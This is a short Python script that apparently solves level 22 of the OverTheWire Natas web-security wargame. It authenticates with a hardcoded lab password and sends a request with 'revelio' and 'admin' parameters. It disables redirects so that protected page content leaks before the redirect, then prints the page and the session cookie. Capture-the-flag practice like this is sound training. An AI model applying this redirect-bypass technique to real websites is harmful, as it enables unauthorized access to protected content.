import requests

url = "http://natas22.natas.labs.overthewire.org/"
username = "natas22"
password = "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz"  #Password for Natas22

params = {"revelio": "1"}
data = {"admin": "1"}

# Send the request
response = requests.get(url, auth=(username, password), data=data, params=params, allow_redirects=False)
print("\n\tSENDING REQ:")
print("" + response.text)
print("-" * 50)
cookie = {"PHPSESSID": response.cookies.get("PHPSESSID")}

print(cookie)